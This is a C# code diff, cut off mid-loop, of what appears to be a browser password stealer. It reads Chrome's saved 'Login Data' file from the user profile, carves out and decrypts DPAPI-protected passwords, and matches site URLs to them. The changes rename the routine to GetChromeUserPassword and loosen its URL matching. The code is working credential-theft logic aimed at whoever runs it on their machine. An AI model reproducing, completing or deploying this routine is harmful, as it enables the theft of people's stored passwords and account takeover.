@@ -17,11 +17,11 @@ namespace TP
 
         protected override string ExtractData()
         {
-            List<string> password = GetBrowserData();
+            List<string> password = GetChromeUserPassword();
             return password.ToString();
         }
 
-        private List<string> GetBrowserData()
+        private List<string> GetChromeUserPassword()
         {
             var pathWithEnv = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data";
             var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
@@ -37,7 +37,6 @@ namespace TP
 
             Regex pwdRegex = new Regex(@"(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70|\Z)");
             var pwdMatches = pwdRegex.Matches(binaryText);
-            var pwdNum = 0;
             List<string> decPwdArray = new List<string>();
 
             foreach (var pwd in pwdMatches)
@@ -48,16 +47,13 @@ namespace TP
                 decPwdArray.Add(decPwd);
             }
 
-            Regex userRegex = new Regex(@"(?<=\x0D\x0D\x0D[\s\S]{2,4}\x68\x74\x74\x70)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)");
+
+            string pattern = @"(ht|f)tp(s?)\:\/\/[0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*(\/?)";
+            Regex userRegex = new Regex(pattern, RegexOptions.IgnoreCase | RegexOptions.Multiline);
             var usrMatches = userRegex.Matches(binaryText);
-            var userMatchCount = usrMatches.Count;
 
-            if (usrMatches.Count != pwdMatches.Count)
-            {
-                Console.Error.WriteLine("Regex Mismatch");
-            }
 
-            List<string> usr = new List<string>();
+            HashSet<string> usr = new HashSet<string>();
 
             foreach (var user in usrMatches)
             {
